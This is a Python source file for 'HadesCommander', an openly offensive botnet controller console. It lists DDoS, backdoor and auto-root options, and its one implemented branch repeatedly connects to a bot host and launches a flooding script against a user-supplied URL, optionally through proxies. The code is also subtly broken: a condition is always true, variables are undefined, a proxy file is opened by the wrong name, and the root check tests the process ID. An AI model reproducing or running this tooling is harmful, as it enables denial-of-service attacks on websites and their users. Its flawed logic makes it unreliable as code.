import os,sys,time,socket,platform
from tabulate import tabulate
from colorama import Fore,init 
from colorama import Back as bg
init(autoreset=True)
class HadesCommander:
    def __init__(self):
        pass
    @staticmethod
    def show_banner(s):
        for c in s + '\n':
            sys.stdout.write(bg.BLACK + Fore.WHITE + c)
            sys.stdout.flush()
            time.sleep(1.2 / 100)
        time.sleep(1.5)
        print('-----------------------------------------------------------------')
        print(Fore.WHITE + '[' + Fore.GREEN + '+' + Fore.WHITE + ']Made By Droid | Github:https://github.com/FonderElite')
        print('-----------------------------------------------------------------')
        time.sleep(1)
    @staticmethod
    def options():
          table = [["Options","Severity","Reference"],["Ddos-attack(0)",5,"https://en.wikipedia.org/wiki/Denial-of-service_attack"],["Backdoor(1)",5,"https://www.malwarebytes.com/backdoor"],["Auto-Root(2)",5,"https://www.lastline.com/labsblog/unmasking-kernel-exploits/"]]
          print(tabulate(table,headers='firstrow',tablefmt='grid'))
    @staticmethod
    def execute():
        s =  socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        host = socket.gethostname()
        if os.getpid() == 0:
            global root_fmt
            root_fmt = '''
{red}┌──(root💀{host_name})-[{cwd}]
└─Option# '''.format(host_name=host,cwd=os.getcwd(),red=Fore.RED,white=Fore.WHITE)
        elif os.getpid() != 0:
            root_fmt = '''
{blue}┌──({host_name}㉿Hades)-[{cwd}]
└─Option$ '''.format(host_name=host,cwd=os.getcwd(),blue=Fore.BLUE,white=Fore.WHITE)
        print(root_fmt,end='')
        choice = input("").lower()
        if choice == "0" or "Ddos-attack":
            ip = input("Bot Ip: ")
            port = int(input("Bot Port: "))
            global url_flood
            url_flood = input("Url to flood: ")
            global url_threads
            url_threads = input("Number of threads: ")
            url_proxy = input("Use Proxies(y/n): ").lower()
            if url_proxy == "y":
                print(f"{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}]Proceeding with using proxies.")
                open_proxy = open(url_proxy,'r')
                read_proxy = open_proxy.readlines()
                while True:
                    s.connect((ip, port))
                    for i in proxy_array:
                        cmd = bytes(os.system(f"python3 scripts/ddos.py -u {url_flood} -t {url_threads} -p {proxy_location}"),'utf-8')
                        s.send(cmd)
            elif url_proxy == "n":
                print(f"{Fore.WHITE}[{Fore.RED}-{Fore.WHITE}]Not using any proxies.")
                while True:
                    s.connect((ip, port))
                    cmd = bytes(os.system(f"python3 scripts/ddos.py -u {url_flood} -t {url_threads}"),'utf-8')
                    s.send(cmd)
            elif url_proxy != "y" or url_proxy != "n":
                print(f"{Fore.WHITE}[{Fore.RED}-{Fore.WHITE}]Invalid Option.")
        else:
            print(f'{Fore.WHITE}[{Fore.RED}-{Fore.WHITE}]Invalid Option.')

if __name__ == '__main__':
        class_obj = HadesCommander()
        banner = class_obj.show_banner(''' 
  ____                                         __
 / ___|___  _ __ ___  _ __ __    __ _ _  _   __| | ___ _ _   _ __  _   _ _ 
| |   / _ \| '_ ` _ \| '_ ` _ \ / _` | '_ \ / _` |/ _ \ '__| | '_ \| | | |
| |__| (_) | | | | | | | | | | | (_| | | | | (_| |  __/ |    | |_) | |_| |
 \____\___/|_| |_| |_|_| |_| |_|\__,_|_| |_|\__,_|\___|_|  (_) .__/ \__, |
                                                             |_|    |___/ 
        ''')
        options = class_obj.options()
        execute = class_obj.execute()
#---------------------------------------
#Use this as commander for hades_bot.py
#---------------------------------------
